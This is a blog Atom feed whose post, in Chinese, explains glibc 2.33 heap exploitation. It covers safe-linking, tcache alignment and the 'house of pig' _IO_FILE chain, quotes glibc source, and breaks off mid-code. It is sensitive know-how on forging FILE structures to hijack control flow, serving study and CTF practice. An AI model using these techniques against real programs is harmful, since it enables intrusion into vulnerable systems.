<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nop&#39;s Blog</title>
  
  <subtitle>There is a long way to go...</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://n0nop.com/"/>
  <updated>2021-11-27T10:37:38.848Z</updated>
  <id>https://n0nop.com/</id>
  
  <author>
    <name>Nop</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Glibc 2.33利用技巧</title>
    <link href="https://n0nop.com/2021/11/27/Glibc-2-33%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://n0nop.com/2021/11/27/Glibc-2-33%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</id>
    <published>2021-11-27T10:14:46.000Z</published>
    <updated>2021-11-27T10:37:38.848Z</updated>
    
    <content type="html"><![CDATA[<p>Glibc 2.33怎么玩？</p><a id="more"></a><h1 id="一些新增机制"><a href="#一些新增机制" class="headerlink" title="一些新增机制"></a>一些新增机制</h1><h2 id="safe-linking"><a href="#safe-linking" class="headerlink" title="safe-linking"></a>safe-linking</h2><p>从Glibc 2.32开始，对tcache单向链表引入safe-linking的保护机制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>且从Glibc 2.33开始，safe-linking也被应用到fastbin中。</p><p>这样其实并没有给利用带来很大的影响，甚至更加容易leak heap address（只需要free一个chunk）。</p><h2 id="tcache-alignment"><a href="#tcache-alignment" class="headerlink" title="tcache alignment"></a>tcache alignment</h2><p>在Glibc 2.31及以前，tcache poisoning可以完成任意地址分配，但是从Glibc 2.32开始，多了一个check，及tcache chunk也需要0x10对齐：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>目前总结的利用技巧主要分为三种：</p><ul><li>_IO_FILE</li><li>__exit_funcs</li><li>tls_dtor_list</li><li>link_map</li></ul><p>下文的出发点在于已经获得一些primitive可以通过堆利用，完成对一些内存地址的读写，如利用fastbin reverse into tcache或者large bin attack向某个地址写入堆地址等。</p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p><strong>house of pig</strong></p><p>从源码的角度上深入分析house of pig整个利用链：</p><p>首先不论是程序正常从__libc_start_main中返回时，还是从显式提供的exit中返回，抑或是abort（有待考证），其原理都是最终需要调用<code>_IO_flush_all_lockp</code>。</p><p>以exit举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call all functions registered with `atexit' and `on_exit',</span></span><br><span class="line"><span class="comment">   in the reverse of the order in which they were registered</span></span><br><span class="line"><span class="comment">   perform stdio cleanup, and terminate program execution with STATUS.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="keyword">int</span> status, struct exit_function_list **listp,</span><br><span class="line">     <span class="keyword">bool</span> run_list_atexit, <span class="keyword">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit' and `on_exit'. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">    restart:</span><br><span class="line">      cur = *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> = &amp;<span class="title">cur</span>-&gt;<span class="title">fns</span>[--<span class="title">cur</span>-&gt;<span class="title">idx</span>];</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">      <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">      <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      atfct ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* Re-lock again before looking at global state.  */</span></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">    <span class="keyword">goto</span> restart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don't free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line"></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>不论<code>__run_exit_handlers</code>中间通过<code>__exit_funcs</code>结构做了多少相关操作，<code>exit</code>最终都会进入下面这段逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br></pre></td></tr></table></figure><p>由于<code>run_list_atexit</code>是<code>__run_exit_handlers</code>的第三个参数，为<code>true</code>，那么一定会调用这个HOOK函数。</p><p>那么这个HOOK函数是什么，结合IDA以及GDB，可以发现它其实是<code>_IO_cleanup</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__libc_atexit:<span class="number">00000000001E2608</span></span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span> ; Segment type: Pure data</span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span> ; Segment permissions: Read/Write</span><br><span class="line">__libc_atexit:00000000001E2608 __libc_atexit   segment qword public 'DATA' use64</span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span>                 assume cs:__libc_atexit</span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span>                 ;org <span class="number">1E2608</span>h</span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span> off_1E2608      dq offset _IO_cleanup   ; DATA XREF: __run_exit_handlers+<span class="number">1</span>DA↑o</span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span>                                         ; sub_59840+<span class="number">1642</span>↑o ...</span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span> __libc_atexit   ends</span><br><span class="line">__libc_atexit:<span class="number">00000000001E2608</span></span><br></pre></td></tr></table></figure><p>这个<code>_IO_cleanup</code>就会执行我们所需要的<code>_IO_flush_all_lockp</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_cleanup (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="keyword">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don't have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they're supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，<code>_IO_flush_all_lockp</code>又干了什么，通过这个调用我们能怎样完成利用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很清楚地看到，该函数地逻辑可以简单地理解为通过<code>_IO_list_all</code>（实际上指向<code>_IO_2_1_stderr_</code>），遍历标准错误、输出、输入流，根据情况调用<code>_IO_OVERFLOW(fp, EOF)</code>刷新相应流缓冲区。</p><p>考虑到利用场景下，我们可以劫持<code>_IO_list_all</code>，或者<code>stderr</code>，<code>stdout</code>，<code>stdin</code>的<code>_chain</code>成员，从而引入一个fake _IO_FILE结构体（记为<code>fake_fp</code>）。</p><p>在满足如下两种条件之一的情况下：（显然第一个条件更为简单）</p><ul><li><p><code>fake_fp-&gt;_mode &lt;= 0</code>：</p><ul><li><code>fake_fp-&gt;_IO_write_ptr &gt; fake_fp-&gt;_IO_write_base</code>：</li></ul></li><li><p><code>fake_fp-&gt;_mode &gt; 0</code>：</p><ul><li><code>fake_fp-&gt;_vtable_offset = 0 &amp;&amp; fake_fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fake_fp-&gt;_wide_data-&gt;_IO_write_base</code></li></ul></li></ul><p>会调用<code>fake_fp-&gt;_vtable-&gt;_IO_overflow_t</code>即<code>vtable + 0x18</code>处的指针指向的函数，且第一个参数为<code>fake_fp</code>自身。</p><p>再考虑从Glibc 2.24开始引入的vtable check，可以实现调用任意vtable中的任意函数指针。</p><p>而house of pig即是在这个基础上，使得<code>fake_fp-&gt;vtable = _IO_str_jumps</code>，那么实际调用的<code>_IO_overflow_t</code>为<code>_IO_str_overflow</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="keyword">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>这里的<code>malloc</code>，<code>memcpy</code>和<code>free</code>就是关键所在，即等价于执行了：</p><ul><li><code>ptr = malloc((fake_fp-&gt;_IO_buf_end - fake_fp-&gt;_IO_buf_base) * 2 + 100)</code></li><li><code>memcpy(ptr, fake_fp-&gt;_IO_buf_base, fake_fp-&gt;_IO_buf_end - fake_fp-&gt;_IO_buf_base)</code></li><li><code>free(ptr)</code></li></ul><p>同时注意到，这里存在一个限制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">...</span><br><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line"><span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span 